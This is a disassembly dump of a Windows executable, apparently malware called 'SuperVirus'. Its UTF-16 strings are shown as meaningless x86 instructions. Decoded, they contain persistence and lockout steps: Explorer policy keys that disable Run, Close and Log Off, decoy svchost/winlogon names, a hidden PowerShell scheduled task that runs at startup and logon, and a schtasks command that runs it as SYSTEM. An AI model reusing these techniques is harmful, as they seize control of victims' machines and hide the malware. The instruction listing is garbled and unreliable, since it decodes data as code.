  406ddd:	00 29                	add    %ch,(%ecx)
  406ddf:	55                   	push   %ebp
  406de0:	00 70 00             	add    %dh,0x0(%eax)
  406de3:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  406de7:	74 00                	je     0x406de9
  406de9:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  406ded:	44                   	inc    %esp
  406dee:	00 69 00             	add    %ch,0x0(%ecx)
  406df1:	73 00                	jae    0x406df3
  406df3:	61                   	popa
  406df4:	00 62 00             	add    %ah,0x0(%edx)
  406df7:	6c                   	insb   (%dx),%es:(%edi)
  406df8:	00 65 00             	add    %ah,0x0(%ebp)
  406dfb:	4e                   	dec    %esi
  406dfc:	00 6f 00             	add    %ch,0x0(%edi)
  406dff:	74 00                	je     0x406e01
  406e01:	69 00 66 00 79 00    	imul   $0x790066,(%eax),%eax
  406e07:	00 77 53             	add    %dh,0x53(%edi)
  406e0a:	00 4f 00             	add    %cl,0x0(%edi)
  406e0d:	46                   	inc    %esi
  406e0e:	00 54 00 57          	add    %dl,0x57(%eax,%eax,1)
  406e12:	00 41 00             	add    %al,0x0(%ecx)
  406e15:	52                   	push   %edx
  406e16:	00 45 00             	add    %al,0x0(%ebp)
  406e19:	5c                   	pop    %esp
  406e1a:	00 4d 00             	add    %cl,0x0(%ebp)
  406e1d:	69 00 63 00 72 00    	imul   $0x720063,(%eax),%eax
  406e23:	6f                   	outsl  %ds:(%esi),(%dx)
  406e24:	00 73 00             	add    %dh,0x0(%ebx)
  406e27:	6f                   	outsl  %ds:(%esi),(%dx)
  406e28:	00 66 00             	add    %ah,0x0(%esi)
  406e2b:	74 00                	je     0x406e2d
  406e2d:	5c                   	pop    %esp
  406e2e:	00 57 00             	add    %dl,0x0(%edi)
  406e31:	69 00 6e 00 64 00    	imul   $0x64006e,(%eax),%eax
  406e37:	6f                   	outsl  %ds:(%esi),(%dx)
  406e38:	00 77 00             	add    %dh,0x0(%edi)
  406e3b:	73 00                	jae    0x406e3d
  406e3d:	5c                   	pop    %esp
  406e3e:	00 43 00             	add    %al,0x0(%ebx)
  406e41:	75 00                	jne    0x406e43
  406e43:	72 00                	jb     0x406e45
  406e45:	72 00                	jb     0x406e47
  406e47:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  406e4b:	74 00                	je     0x406e4d
  406e4d:	56                   	push   %esi
  406e4e:	00 65 00             	add    %ah,0x0(%ebp)
  406e51:	72 00                	jb     0x406e53
  406e53:	73 00                	jae    0x406e55
  406e55:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  406e5b:	5c                   	pop    %esp
  406e5c:	00 50 00             	add    %dl,0x0(%eax)
  406e5f:	6f                   	outsl  %ds:(%esi),(%dx)
  406e60:	00 6c 00 69          	add    %ch,0x69(%eax,%eax,1)
  406e64:	00 63 00             	add    %ah,0x0(%ebx)
  406e67:	69 00 65 00 73 00    	imul   $0x730065,(%eax),%eax
  406e6d:	5c                   	pop    %esp
  406e6e:	00 45 00             	add    %al,0x0(%ebp)
  406e71:	78 00                	js     0x406e73
  406e73:	70 00                	jo     0x406e75
  406e75:	6c                   	insb   (%dx),%es:(%edi)
  406e76:	00 6f 00             	add    %ch,0x0(%edi)
  406e79:	72 00                	jb     0x406e7b
  406e7b:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  406e7f:	00 23                	add    %ah,(%ebx)
  406e81:	4e                   	dec    %esi
  406e82:	00 6f 00             	add    %ch,0x0(%edi)
  406e85:	43                   	inc    %ebx
  406e86:	00 68 00             	add    %ch,0x0(%eax)
  406e89:	61                   	popa
  406e8a:	00 6e 00             	add    %ch,0x0(%esi)
  406e8d:	67 00 65 00          	add    %ah,0x0(%di)
  406e91:	53                   	push   %ebx
  406e92:	00 74 00 61          	add    %dh,0x61(%eax,%eax,1)
  406e96:	00 72 00             	add    %dh,0x0(%edx)
  406e99:	74 00                	je     0x406e9b
  406e9b:	4d                   	dec    %ebp
  406e9c:	00 65 00             	add    %ah,0x0(%ebp)
  406e9f:	6e                   	outsb  %ds:(%esi),(%dx)
  406ea0:	00 75 00             	add    %dh,0x0(%ebp)
  406ea3:	00 0f                	add    %cl,(%edi)
  406ea5:	4e                   	dec    %esi
  406ea6:	00 6f 00             	add    %ch,0x0(%edi)
  406ea9:	43                   	inc    %ebx
  406eaa:	00 6c 00 6f          	add    %ch,0x6f(%eax,%eax,1)
  406eae:	00 73 00             	add    %dh,0x0(%ebx)
  406eb1:	65 00 00             	add    %al,%gs:(%eax)
  406eb4:	11 4e 00             	adc    %ecx,0x0(%esi)
  406eb7:	6f                   	outsl  %ds:(%esi),(%dx)
  406eb8:	00 4c 00 6f          	add    %cl,0x6f(%eax,%eax,1)
  406ebc:	00 67 00             	add    %ah,0x0(%edi)
  406ebf:	4f                   	dec    %edi
  406ec0:	00 66 00             	add    %ah,0x0(%esi)
  406ec3:	66 00 00             	data16 add %al,(%eax)
  406ec6:	0b 4e 00             	or     0x0(%esi),%ecx
  406ec9:	6f                   	outsl  %ds:(%esi),(%dx)
  406eca:	00 52 00             	add    %dl,0x0(%edx)
  406ecd:	75 00                	jne    0x406ecf
  406ecf:	6e                   	outsb  %ds:(%esi),(%dx)
  406ed0:	00 00                	add    %al,(%eax)
  406ed2:	37                   	aaa
  406ed3:	43                   	inc    %ebx
  406ed4:	00 3a                	add    %bh,(%edx)
  406ed6:	00 5c 00 57          	add    %bl,0x57(%eax,%eax,1)
  406eda:	00 69 00             	add    %ch,0x0(%ecx)
  406edd:	6e                   	outsb  %ds:(%esi),(%dx)
  406ede:	00 64 00 6f          	add    %ah,0x6f(%eax,%eax,1)
  406ee2:	00 77 00             	add    %dh,0x0(%edi)
  406ee5:	73 00                	jae    0x406ee7
  406ee7:	5c                   	pop    %esp
  406ee8:	00 53 00             	add    %dl,0x0(%ebx)
  406eeb:	79 00                	jns    0x406eed
  406eed:	73 00                	jae    0x406eef
  406eef:	74 00                	je     0x406ef1
  406ef1:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  406ef5:	33 00                	xor    (%eax),%eax
  406ef7:	32 00                	xor    (%eax),%al
  406ef9:	5c                   	pop    %esp
  406efa:	00 64 00 72          	add    %ah,0x72(%eax,%eax,1)
  406efe:	00 69 00             	add    %ch,0x0(%ecx)
  406f01:	76 00                	jbe    0x406f03
  406f03:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  406f07:	73 00                	jae    0x406f09
  406f09:	00 35 43 00 3a 00    	add    %dh,0x3a0043
  406f0f:	5c                   	pop    %esp
  406f10:	00 57 00             	add    %dl,0x0(%edi)
  406f13:	69 00 6e 00 64 00    	imul   $0x64006e,(%eax),%eax
  406f19:	6f                   	outsl  %ds:(%esi),(%dx)
  406f1a:	00 77 00             	add    %dh,0x0(%edi)
  406f1d:	73 00                	jae    0x406f1f
  406f1f:	5c                   	pop    %esp
  406f20:	00 53 00             	add    %dl,0x0(%ebx)
  406f23:	79 00                	jns    0x406f25
  406f25:	73 00                	jae    0x406f27
  406f27:	74 00                	je     0x406f29
  406f29:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  406f2d:	33 00                	xor    (%eax),%eax
  406f2f:	32 00                	xor    (%eax),%al
  406f31:	5c                   	pop    %esp
  406f32:	00 63 00             	add    %ah,0x0(%ebx)
  406f35:	6f                   	outsl  %ds:(%esi),(%dx)
  406f36:	00 6e 00             	add    %ch,0x0(%esi)
  406f39:	66 00 69 00          	data16 add %ch,0x0(%ecx)
  406f3d:	67 00 00             	add    %al,(%bx,%si)
  406f40:	1f                   	pop    %ds
  406f41:	43                   	inc    %ebx
  406f42:	00 3a                	add    %bh,(%edx)
  406f44:	00 5c 00 57          	add    %bl,0x57(%eax,%eax,1)
  406f48:	00 69 00             	add    %ch,0x0(%ecx)
  406f4b:	6e                   	outsb  %ds:(%esi),(%dx)
  406f4c:	00 64 00 6f          	add    %ah,0x6f(%eax,%eax,1)
  406f50:	00 77 00             	add    %dh,0x0(%edi)
  406f53:	73 00                	jae    0x406f55
  406f55:	5c                   	pop    %esp
  406f56:	00 54 00 65          	add    %dl,0x65(%eax,%eax,1)
  406f5a:	00 6d 00             	add    %ch,0x0(%ebp)
  406f5d:	70 00                	jo     0x406f5f
  406f5f:	00 17                	add    %dl,(%edi)
  406f61:	73 00                	jae    0x406f63
  406f63:	76 00                	jbe    0x406f65
  406f65:	63 00                	arpl   %eax,(%eax)
  406f67:	68 00 6f 00 73       	push   $0x73006f00
  406f6c:	00 74 00 2e          	add    %dh,0x2e(%eax,%eax,1)
  406f70:	00 65 00             	add    %ah,0x0(%ebp)
  406f73:	78 00                	js     0x406f75
  406f75:	65 00 00             	add    %al,%gs:(%eax)
  406f78:	19 77 00             	sbb    %esi,0x0(%edi)
  406f7b:	69 00 6e 00 6c 00    	imul   $0x6c006e,(%eax),%eax
  406f81:	6f                   	outsl  %ds:(%esi),(%dx)
  406f82:	00 67 00             	add    %ah,0x0(%edi)
  406f85:	6f                   	outsl  %ds:(%esi),(%dx)
  406f86:	00 6e 00             	add    %ch,0x0(%esi)
  406f89:	2e 00 65 00          	add    %ah,%cs:0x0(%ebp)
  406f8d:	78 00                	js     0x406f8f
  406f8f:	65 00 00             	add    %al,%gs:(%eax)
  406f92:	41                   	inc    %ecx
  406f93:	05 27 20 00 41       	add    $0x41002027,%eax
  406f98:	00 44 00 44          	add    %al,0x44(%eax,%eax,1)
  406f9c:	00 45 00             	add    %al,0x0(%ebp)
  406f9f:	44                   	inc    %esp
  406fa0:	00 20                	add    %ah,(%eax)
  406fa2:	00 54 00 4f          	add    %dl,0x4f(%eax,%eax,1)
  406fa6:	00 20                	add    %ah,(%eax)
  406fa8:	00 32                	add    %dh,(%edx)
  406faa:	00 30                	add    %dh,(%eax)
  406fac:	00 2b                	add    %ch,(%ebx)
  406fae:	00 20                	add    %ah,(%eax)
  406fb0:	00 53 00             	add    %dl,0x0(%ebx)
  406fb3:	54                   	push   %esp
  406fb4:	00 41 00             	add    %al,0x0(%ecx)
  406fb7:	52                   	push   %edx
  406fb8:	00 54 00 55          	add    %dl,0x55(%eax,%eax,1)
  406fbc:	00 50 00             	add    %dl,0x0(%eax)
  406fbf:	20 00                	and    %al,(%eax)
  406fc1:	4c                   	dec    %esp
  406fc2:	00 4f 00             	add    %cl,0x0(%edi)
  406fc5:	43                   	inc    %ebx
  406fc6:	00 41 00             	add    %al,0x0(%ecx)
  406fc9:	54                   	push   %esp
  406fca:	00 49 00             	add    %cl,0x0(%ecx)
  406fcd:	4f                   	dec    %edi
  406fce:	00 4e 00             	add    %cl,0x0(%esi)
  406fd1:	53                   	push   %ebx
  406fd2:	00 01                	add    %al,(%ecx)
  406fd4:	1f                   	pop    %ds
  406fd5:	53                   	push   %ebx
  406fd6:	00 74 00 61          	add    %dh,0x61(%eax,%eax,1)
  406fda:	00 72 00             	add    %dh,0x0(%edx)
  406fdd:	74 00                	je     0x406fdf
  406fdf:	75 00                	jne    0x406fe1
  406fe1:	70 00                	jo     0x406fe3
  406fe3:	20 00                	and    %al,(%eax)
  406fe5:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  406fe9:	72 00                	jb     0x406feb
  406feb:	6f                   	outsl  %ds:(%esi),(%dx)
  406fec:	00 72 00             	add    %dh,0x0(%edx)
  406fef:	3a 00                	cmp    (%eax),%al
  406ff1:	20 00                	and    %al,(%eax)
  406ff3:	00 1d 53 00 75 00    	add    %bl,0x750053
  406ff9:	70 00                	jo     0x406ffb
  406ffb:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  406fff:	56                   	push   %esi
  407000:	00 69 00             	add    %ch,0x0(%ecx)
  407003:	72 00                	jb     0x407005
  407005:	75 00                	jne    0x407007
  407007:	73 00                	jae    0x407009
  407009:	2e 00 65 00          	add    %ah,%cs:0x0(%ebp)
  40700d:	78 00                	js     0x40700f
  40700f:	65 00 00             	add    %al,%gs:(%eax)
  407012:	5d                   	pop    %ebp
  407013:	0d 00 0a 00 24       	or     $0x24000a00,%eax
  407018:	00 61 00             	add    %ah,0x0(%ecx)
  40701b:	63 00                	arpl   %eax,(%eax)
  40701d:	74 00                	je     0x40701f
  40701f:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  407025:	20 00                	and    %al,(%eax)
  407027:	3d 00 20 00 4e       	cmp    $0x4e002000,%eax
  40702c:	00 65 00             	add    %ah,0x0(%ebp)
  40702f:	77 00                	ja     0x407031
  407031:	2d 00 53 00 63       	sub    $0x63005300,%eax
  407036:	00 68 00             	add    %ch,0x0(%eax)
  407039:	65 00 64 00 75       	add    %ah,%gs:0x75(%eax,%eax,1)
  40703e:	00 6c 00 65          	add    %ch,0x65(%eax,%eax,1)
  407042:	00 64 00 54          	add    %ah,0x54(%eax,%eax,1)
  407046:	00 61 00             	add    %ah,0x0(%ecx)
  407049:	73 00                	jae    0x40704b
  40704b:	6b 00 41             	imul   $0x41,(%eax),%eax
  40704e:	00 63 00             	add    %ah,0x0(%ebx)
  407051:	74 00                	je     0x407053
  407053:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  407059:	20 00                	and    %al,(%eax)
  40705b:	2d 00 45 00 78       	sub    $0x78004500,%eax
  407060:	00 65 00             	add    %ah,0x0(%ebp)
  407063:	63 00                	arpl   %eax,(%eax)
  407065:	75 00                	jne    0x407067
  407067:	74 00                	je     0x407069
  407069:	65 00 20             	add    %ah,%gs:(%eax)
  40706c:	00 27                	add    %ah,(%edi)
  40706e:	00 01                	add    %al,(%ecx)
  407070:	82 85 27 00 0d 00 0a 	addb   $0xa,0xd0027(%ebp)
  407077:	00 24 00             	add    %ah,(%eax,%eax,1)
  40707a:	74 00                	je     0x40707c
  40707c:	72 00                	jb     0x40707e
  40707e:	69 00 67 00 67 00    	imul   $0x670067,(%eax),%eax
  407084:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  407088:	31 00                	xor    %eax,(%eax)
  40708a:	20 00                	and    %al,(%eax)
  40708c:	3d 00 20 00 4e       	cmp    $0x4e002000,%eax
  407091:	00 65 00             	add    %ah,0x0(%ebp)
  407094:	77 00                	ja     0x407096
  407096:	2d 00 53 00 63       	sub    $0x63005300,%eax
  40709b:	00 68 00             	add    %ch,0x0(%eax)
  40709e:	65 00 64 00 75       	add    %ah,%gs:0x75(%eax,%eax,1)
  4070a3:	00 6c 00 65          	add    %ch,0x65(%eax,%eax,1)
  4070a7:	00 64 00 54          	add    %ah,0x54(%eax,%eax,1)
  4070ab:	00 61 00             	add    %ah,0x0(%ecx)
  4070ae:	73 00                	jae    0x4070b0
  4070b0:	6b 00 54             	imul   $0x54,(%eax),%eax
  4070b3:	00 72 00             	add    %dh,0x0(%edx)
  4070b6:	69 00 67 00 67 00    	imul   $0x670067,(%eax),%eax
  4070bc:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  4070c0:	20 00                	and    %al,(%eax)
  4070c2:	2d 00 41 00 74       	sub    $0x74004100,%eax
  4070c7:	00 53 00             	add    %dl,0x0(%ebx)
  4070ca:	74 00                	je     0x4070cc
  4070cc:	61                   	popa
  4070cd:	00 72 00             	add    %dh,0x0(%edx)
  4070d0:	74 00                	je     0x4070d2
  4070d2:	75 00                	jne    0x4070d4
  4070d4:	70 00                	jo     0x4070d6
  4070d6:	0d 00 0a 00 24       	or     $0x24000a00,%eax
  4070db:	00 74 00 72          	add    %dh,0x72(%eax,%eax,1)
  4070df:	00 69 00             	add    %ch,0x0(%ecx)
  4070e2:	67 00 67 00          	add    %ah,0x0(%bx)
  4070e6:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  4070ea:	32 00                	xor    (%eax),%al
  4070ec:	20 00                	and    %al,(%eax)
  4070ee:	3d 00 20 00 4e       	cmp    $0x4e002000,%eax
  4070f3:	00 65 00             	add    %ah,0x0(%ebp)
  4070f6:	77 00                	ja     0x4070f8
  4070f8:	2d 00 53 00 63       	sub    $0x63005300,%eax
  4070fd:	00 68 00             	add    %ch,0x0(%eax)
  407100:	65 00 64 00 75       	add    %ah,%gs:0x75(%eax,%eax,1)
  407105:	00 6c 00 65          	add    %ch,0x65(%eax,%eax,1)
  407109:	00 64 00 54          	add    %ah,0x54(%eax,%eax,1)
  40710d:	00 61 00             	add    %ah,0x0(%ecx)
  407110:	73 00                	jae    0x407112
  407112:	6b 00 54             	imul   $0x54,(%eax),%eax
  407115:	00 72 00             	add    %dh,0x0(%edx)
  407118:	69 00 67 00 67 00    	imul   $0x670067,(%eax),%eax
  40711e:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  407122:	20 00                	and    %al,(%eax)
  407124:	2d 00 41 00 74       	sub    $0x74004100,%eax
  407129:	00 4c 00 6f          	add    %cl,0x6f(%eax,%eax,1)
  40712d:	00 67 00             	add    %ah,0x0(%edi)
  407130:	4f                   	dec    %edi
  407131:	00 6e 00             	add    %ch,0x0(%esi)
  407134:	0d 00 0a 00 24       	or     $0x24000a00,%eax
  407139:	00 73 00             	add    %dh,0x0(%ebx)
  40713c:	65 00 74 00 74       	add    %dh,%gs:0x74(%eax,%eax,1)
  407141:	00 69 00             	add    %ch,0x0(%ecx)
  407144:	6e                   	outsb  %ds:(%esi),(%dx)
  407145:	00 67 00             	add    %ah,0x0(%edi)
  407148:	73 00                	jae    0x40714a
  40714a:	20 00                	and    %al,(%eax)
  40714c:	3d 00 20 00 4e       	cmp    $0x4e002000,%eax
  407151:	00 65 00             	add    %ah,0x0(%ebp)
  407154:	77 00                	ja     0x407156
  407156:	2d 00 53 00 63       	sub    $0x63005300,%eax
  40715b:	00 68 00             	add    %ch,0x0(%eax)
  40715e:	65 00 64 00 75       	add    %ah,%gs:0x75(%eax,%eax,1)
  407163:	00 6c 00 65          	add    %ch,0x65(%eax,%eax,1)
  407167:	00 64 00 54          	add    %ah,0x54(%eax,%eax,1)
  40716b:	00 61 00             	add    %ah,0x0(%ecx)
  40716e:	73 00                	jae    0x407170
  407170:	6b 00 53             	imul   $0x53,(%eax),%eax
  407173:	00 65 00             	add    %ah,0x0(%ebp)
  407176:	74 00                	je     0x407178
  407178:	74 00                	je     0x40717a
  40717a:	69 00 6e 00 67 00    	imul   $0x67006e,(%eax),%eax
  407180:	73 00                	jae    0x407182
  407182:	53                   	push   %ebx
  407183:	00 65 00             	add    %ah,0x0(%ebp)
  407186:	74 00                	je     0x407188
  407188:	20 00                	and    %al,(%eax)
  40718a:	2d 00 41 00 6c       	sub    $0x6c004100,%eax
  40718f:	00 6c 00 6f          	add    %ch,0x6f(%eax,%eax,1)
  407193:	00 77 00             	add    %dh,0x0(%edi)
  407196:	53                   	push   %ebx
  407197:	00 74 00 61          	add    %dh,0x61(%eax,%eax,1)
  40719b:	00 72 00             	add    %dh,0x0(%edx)
  40719e:	74 00                	je     0x4071a0
  4071a0:	49                   	dec    %ecx
  4071a1:	00 66 00             	add    %ah,0x0(%esi)
  4071a4:	4f                   	dec    %edi
  4071a5:	00 6e 00             	add    %ch,0x0(%esi)
  4071a8:	42                   	inc    %edx
  4071a9:	00 61 00             	add    %ah,0x0(%ecx)
  4071ac:	74 00                	je     0x4071ae
  4071ae:	74 00                	je     0x4071b0
  4071b0:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  4071b4:	69 00 65 00 73 00    	imul   $0x730065,(%eax),%eax
  4071ba:	20 00                	and    %al,(%eax)
  4071bc:	2d 00 44 00 6f       	sub    $0x6f004400,%eax
  4071c1:	00 6e 00             	add    %ch,0x0(%esi)
  4071c4:	74 00                	je     0x4071c6
  4071c6:	53                   	push   %ebx
  4071c7:	00 74 00 6f          	add    %dh,0x6f(%eax,%eax,1)
  4071cb:	00 70 00             	add    %dh,0x0(%eax)
  4071ce:	49                   	dec    %ecx
  4071cf:	00 66 00             	add    %ah,0x0(%esi)
  4071d2:	47                   	inc    %edi
  4071d3:	00 6f 00             	add    %ch,0x0(%edi)
  4071d6:	69 00 6e 00 67 00    	imul   $0x67006e,(%eax),%eax
  4071dc:	4f                   	dec    %edi
  4071dd:	00 6e 00             	add    %ch,0x0(%esi)
  4071e0:	42                   	inc    %edx
  4071e1:	00 61 00             	add    %ah,0x0(%ecx)
  4071e4:	74 00                	je     0x4071e6
  4071e6:	74 00                	je     0x4071e8
  4071e8:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  4071ec:	69 00 65 00 73 00    	imul   $0x730065,(%eax),%eax
  4071f2:	20 00                	and    %al,(%eax)
  4071f4:	2d 00 48 00 69       	sub    $0x69004800,%eax
  4071f9:	00 64 00 64          	add    %ah,0x64(%eax,%eax,1)
  4071fd:	00 65 00             	add    %ah,0x0(%ebp)
  407200:	6e                   	outsb  %ds:(%esi),(%dx)
  407201:	00 0d 00 0a 00 52    	add    %cl,0x52000a00
  407207:	00 65 00             	add    %ah,0x0(%ebp)
  40720a:	67 00 69 00          	add    %ch,0x0(%bx,%di)
  40720e:	73 00                	jae    0x407210
  407210:	74 00                	je     0x407212
  407212:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  407216:	2d 00 53 00 63       	sub    $0x63005300,%eax
  40721b:	00 68 00             	add    %ch,0x0(%eax)
  40721e:	65 00 64 00 75       	add    %ah,%gs:0x75(%eax,%eax,1)
  407223:	00 6c 00 65          	add    %ch,0x65(%eax,%eax,1)
  407227:	00 64 00 54          	add    %ah,0x54(%eax,%eax,1)
  40722b:	00 61 00             	add    %ah,0x0(%ecx)
  40722e:	73 00                	jae    0x407230
  407230:	6b 00 20             	imul   $0x20,(%eax),%eax
  407233:	00 2d 00 54 00 61    	add    %ch,0x61005400
  407239:	00 73 00             	add    %dh,0x0(%ebx)
  40723c:	6b 00 4e             	imul   $0x4e,(%eax),%eax
  40723f:	00 61 00             	add    %ah,0x0(%ecx)
  407242:	6d                   	insl   (%dx),%es:(%edi)
  407243:	00 65 00             	add    %ah,0x0(%ebp)
  407246:	20 00                	and    %al,(%eax)
  407248:	27                   	daa
  407249:	00 53 00             	add    %dl,0x0(%ebx)
  40724c:	75 00                	jne    0x40724e
  40724e:	70 00                	jo     0x407250
  407250:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  407254:	56                   	push   %esi
  407255:	00 69 00             	add    %ch,0x0(%ecx)
  407258:	72 00                	jb     0x40725a
  40725a:	75 00                	jne    0x40725c
  40725c:	73 00                	jae    0x40725e
  40725e:	27                   	daa
  40725f:	00 20                	add    %ah,(%eax)
  407261:	00 2d 00 41 00 63    	add    %ch,0x63004100
  407267:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  40726b:	00 6f 00             	add    %ch,0x0(%edi)
  40726e:	6e                   	outsb  %ds:(%esi),(%dx)
  40726f:	00 20                	add    %ah,(%eax)
  407271:	00 24 00             	add    %ah,(%eax,%eax,1)
  407274:	61                   	popa
  407275:	00 63 00             	add    %ah,0x0(%ebx)
  407278:	74 00                	je     0x40727a
  40727a:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  407280:	20 00                	and    %al,(%eax)
  407282:	2d 00 54 00 72       	sub    $0x72005400,%eax
  407287:	00 69 00             	add    %ch,0x0(%ecx)
  40728a:	67 00 67 00          	add    %ah,0x0(%bx)
  40728e:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  407292:	20 00                	and    %al,(%eax)
  407294:	24 00                	and    $0x0,%al
  407296:	74 00                	je     0x407298
  407298:	72 00                	jb     0x40729a
  40729a:	69 00 67 00 67 00    	imul   $0x670067,(%eax),%eax
  4072a0:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  4072a4:	31 00                	xor    %eax,(%eax)
  4072a6:	2c 00                	sub    $0x0,%al
  4072a8:	20 00                	and    %al,(%eax)
  4072aa:	24 00                	and    $0x0,%al
  4072ac:	74 00                	je     0x4072ae
  4072ae:	72 00                	jb     0x4072b0
  4072b0:	69 00 67 00 67 00    	imul   $0x670067,(%eax),%eax
  4072b6:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  4072ba:	32 00                	xor    (%eax),%al
  4072bc:	20 00                	and    %al,(%eax)
  4072be:	2d 00 53 00 65       	sub    $0x65005300,%eax
  4072c3:	00 74 00 74          	add    %dh,0x74(%eax,%eax,1)
  4072c7:	00 69 00             	add    %ch,0x0(%ecx)
  4072ca:	6e                   	outsb  %ds:(%esi),(%dx)
  4072cb:	00 67 00             	add    %ah,0x0(%edi)
  4072ce:	73 00                	jae    0x4072d0
  4072d0:	20 00                	and    %al,(%eax)
  4072d2:	24 00                	and    $0x0,%al
  4072d4:	73 00                	jae    0x4072d6
  4072d6:	65 00 74 00 74       	add    %dh,%gs:0x74(%eax,%eax,1)
  4072db:	00 69 00             	add    %ch,0x0(%ecx)
  4072de:	6e                   	outsb  %ds:(%esi),(%dx)
  4072df:	00 67 00             	add    %ah,0x0(%edi)
  4072e2:	73 00                	jae    0x4072e4
  4072e4:	20 00                	and    %al,(%eax)
  4072e6:	2d 00 46 00 6f       	sub    $0x6f004600,%eax
  4072eb:	00 72 00             	add    %dh,0x0(%edx)
  4072ee:	63 00                	arpl   %eax,(%eax)
  4072f0:	65 00 0d 00 0a 00 01 	add    %cl,%gs:0x1000a00
  4072f7:	11 74 00 61          	adc    %esi,0x61(%eax,%eax,1)
  4072fb:	00 73 00             	add    %dh,0x0(%ebx)
  4072fe:	6b 00 2e             	imul   $0x2e,(%eax),%eax
  407301:	00 70 00             	add    %dh,0x0(%eax)
  407304:	73 00                	jae    0x407306
  407306:	31 00                	xor    %eax,(%eax)
  407308:	00 4f 73             	add    %cl,0x73(%edi)
  40730b:	00 63 00             	add    %ah,0x0(%ebx)
  40730e:	68 00 74 00 61       	push   $0x61007400
  407313:	00 73 00             	add    %dh,0x0(%ebx)
  407316:	6b 00 73             	imul   $0x73,(%eax),%eax
  407319:	00 20                	add    %ah,(%eax)
  40731b:	00 2f                	add    %ch,(%edi)
  40731d:	00 63 00             	add    %ah,0x0(%ebx)
  407320:	72 00                	jb     0x407322
  407322:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  407326:	74 00                	je     0x407328
  407328:	65 00 20             	add    %ah,%gs:(%eax)
  40732b:	00 2f                	add    %ch,(%edi)
  40732d:	00 74 00 6e          	add    %dh,0x6e(%eax,%eax,1)
  407331:	00 20                	add    %ah,(%eax)
  407333:	00 22                	add    %ah,(%edx)
  407335:	00 53 00             	add    %dl,0x0(%ebx)
  407338:	75 00                	jne    0x40733a
  40733a:	70 00                	jo     0x40733c
  40733c:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  407340:	56                   	push   %esi
  407341:	00 69 00             	add    %ch,0x0(%ecx)
  407344:	72 00                	jb     0x407346
  407346:	75 00                	jne    0x407348
  407348:	73 00                	jae    0x40734a
  40734a:	22 00                	and    (%eax),%al
  40734c:	20 00                	and    %al,(%eax)
  40734e:	2f                   	das
  40734f:	00 74 00 72          	add    %dh,0x72(%eax,%eax,1)
  407353:	00 20                	add    %ah,(%eax)
  407355:	00 22                	add    %ah,(%edx)
  407357:	00 00                	add    %al,(%eax)
  407359:	37                   	aaa
  40735a:	22 00                	and    (%eax),%al
  40735c:	20 00                	and    %al,(%eax)
  40735e:	2f                   	das
  40735f:	00 73 00             	add    %dh,0x0(%ebx)
  407362:	63 00                	arpl   %eax,(%eax)
  407364:	20 00                	and    %al,(%eax)
  407366:	6f                   	outsl  %ds:(%esi),(%dx)
  407367:	00 6e 00             	add    %ch,0x0(%esi)
  40736a:	6c                   	insb   (%dx),%es:(%edi)
  40736b:	00 6f 00             	add    %ch,0x0(%edi)
  40736e:	67 00 6f 00          	add    %ch,0x0(%bx)
  407372:	6e                   	outsb  %ds:(%esi),(%dx)
  407373:	00 20                	add    %ah,(%eax)
  407375:	00 2f                	add    %ch,(%edi)
  407377:	00 72 00             	add    %dh,0x0(%edx)
  40737a:	75 00                	jne    0x40737c
  40737c:	20 00                	and    %al,(%eax)
  40737e:	53                   	push   %ebx
  40737f:	00 59 00             	add    %bl,0x0(%ecx)
  407382:	53                   	push   %ebx
  407383:	00 54 00 45          	add    %dl,0x45(%eax,%eax,1)
  407387:	00 4d 00             	add    %cl,0x0(%ebp)
  40738a:	20 00                	and    %al,(%eax)
  40738c:	2f                   	das
  40738d:	00 66 00             	add    %ah,0x0(%esi)
  407390:	00 5d 73             	add    %bl,0x73(%ebp)
  407393:	00 63 00             	add    %ah,0x0(%ebx)
  407396:	68 00 74 00 61       	push   $0x61007400
  40739b:	00 73 00             	add    %dh,0x0(%ebx)
  40739e:	6b 00 73             	imul   $0x73,(%eax),%eax
  4073a1:	00 20                	add    %ah,(%eax)
  4073a3:	00 2f                	add    %ch,(%edi)
  4073a5:	00 63 00             	add    %ah,0x0(%ebx)
  4073a8:	72 00                	jb     0x4073aa
  4073aa:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  4073ae:	74 00                	je     0x4073b0
  4073b0:	65 00 20             	add    %ah,%gs:(%eax)
  4073b3:	00 2f                	add    %ch,(%edi)
  4073b5:	00 74 00 6e          	add    %dh,0x6e(%eax,%eax,1)
  4073b9:	00 20                	add    %ah,(%eax)
  4073bb:	00 22                	add    %ah,(%edx)
  4073bd:	00 53 00             	add    %dl,0x0(%ebx)
  4073c0:	75 00                	jne    0x4073c2
  4073c2:	70 00                	jo     0x4073c4
  4073c4:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  4073c8:	56                   	push   %esi
  4073c9:	00 69 00             	add    %ch,0x0(%ecx)
  4073cc:	72 00                	jb     0x4073ce
  4073ce:	75 00                	jne    0x4073d0
  4073d0:	73 00                	jae    0x4073d2
  4073d2:	53                   	push   %ebx
  4073d3:	00 74 00 61          	add    %dh,0x61(%eax,%eax,1)
  4073d7:	00 72 00             	add    %dh,0x0(%edx)
